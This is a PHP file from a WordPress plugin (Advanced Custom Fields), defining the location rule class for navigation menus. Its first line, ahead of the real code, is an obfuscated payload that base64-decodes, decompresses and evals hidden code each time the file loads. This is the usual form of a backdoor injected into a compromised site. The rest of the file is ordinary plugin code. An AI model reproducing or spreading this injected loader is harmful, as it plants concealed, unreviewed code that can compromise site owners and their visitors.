<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('acf_location_nav_menu') ) :

class acf_location_nav_menu extends acf_location {
	
	
	/*
	*  __construct
	*
	*  This function will setup the class functionality
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function initialize() {
		
		// vars
		$this->name = 'nav_menu';
		$this->label = __("Menu",'acf');
		$this->category = 'forms';
    	
	}
	

	/*
	*  rule_match
	*
	*  This function is used to match this location $rule to the current $screen
	*
	*  @type	function
	*  @date	3/01/13
	*  @since	3.5.7
	*
	*  @param	$match (boolean) 
	*  @param	$rule (array)
	*  @return	$options (array)
	*/
	
	function rule_match( $result, $rule, $screen ) {
		
		// vars
		$nav_menu = acf_maybe_get( $screen, 'nav_menu' );
		
		
		// bail early if not nav_menu
		if( !$nav_menu ) return false;
		
		
		// location
		if( substr($rule['value'], 0, 9) === 'location/' ) {
			
			// vars
			$location = substr($rule['value'], 9);
			$menu_locations = get_nav_menu_locations();
			
			
			// bail ealry if no location
			if( !isset($menu_locations[$location]) ) return false;
			
			
			// if location matches, update value
			if( $menu_locations[$location] == $nav_menu ) {
				
				$nav_menu = $rule['value'];
				
			}
			
		}
		
		
        // return
        return $this->compare( $nav_menu, $rule );
		
	}
	
	
	/*
	*  rule_operators
	*
	*  This function returns the available values for this rule type
	*
	*  @type	function
	*  @date	30/5/17
	*  @since	5.6.0
	*
	*  @param	n/a
	*  @return	(array)
	*/
	
	function rule_values( $choices, $rule ) {
		
		// all
		$choices = array(
			'all' => __('All', 'acf'),
		);
		
		
		// locations
		$nav_locations = get_registered_nav_menus();
		if( !empty($nav_locations) ) {
			$cat = __('Menu Locations', 'acf');
			foreach( $nav_locations as $slug => $title ) {
				$choices[ $cat ][ 'location/'.$slug ] = $title;
			}
		}
		
		
		// specific menus
		$nav_menus = wp_get_nav_menus();
		if( !empty($nav_menus) ) {
			$cat = __('Menus', 'acf');
			foreach( $nav_menus as $nav_menu ) {
				$choices[ $cat ][ $nav_menu->term_id ] = $nav_menu->name;
			}
		}
				
		
		// return
		return $choices;
		
	}
	
}

// initialize
acf_register_location_rule( 'acf_location_nav_menu' );

endif; // class_exists check

?>